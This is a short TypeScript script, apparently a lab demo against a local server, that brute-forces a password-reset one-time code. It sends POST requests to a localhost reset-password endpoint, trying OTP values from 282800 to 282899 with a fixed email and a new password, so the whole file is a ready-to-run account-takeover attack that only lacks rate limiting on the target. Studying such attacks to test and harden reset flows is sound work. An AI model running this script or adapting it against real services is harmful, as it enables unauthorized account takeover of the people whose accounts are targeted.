import axios from "axios";
async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "bidve@gmail.com",
    otp: otp,
    newPassword: "123123123",
  });
  console.log(otp);

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    await axios.request(config);
    console.log("done for " + otp);
  } catch (e) {}
}

for (let i = 282800; i < 282900; i++) {
  console.log(i);
  sendRequest(i.toString());
}
